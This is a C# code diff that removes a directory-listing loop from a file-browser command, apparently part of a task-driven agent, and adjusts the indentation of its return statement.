@@ -48,32 +48,10 @@ namespace Athena
                         status = "error",
                         task_id = (string)args["task-id"]
                     };
-                    foreach (var fInfo in parentDirectoryInfo.GetFileSystemInfos())
-                    {
-                        var file = new FileBrowserFile
-                        {
-                            is_file = !fInfo.Attributes.HasFlag(FileAttributes.Directory),
-                            permissions = new Dictionary<string, string>(),
-                            name = fInfo.Name,
-                            access_time = new DateTimeOffset(parentDirectoryInfo.LastAccessTime).ToUnixTimeMilliseconds().ToString(),
-                            modify_time = new DateTimeOffset(parentDirectoryInfo.LastWriteTime).ToUnixTimeMilliseconds().ToString(),
-                        };
-
-                        if (file.is_file)
-                        {
-                            file.size = new FileInfo(fInfo.FullName).Length;
-                        }
-                        else
-                        {
-                            file.size = 0;
-                        }
-
-                        files.Add(file);
-                    }
                 }
 
 
-                return new FileBrowserResponseResult
+                    return new FileBrowserResponseResult
                 {
                     user_output = "File/Folder found!",
                     completed = "true",
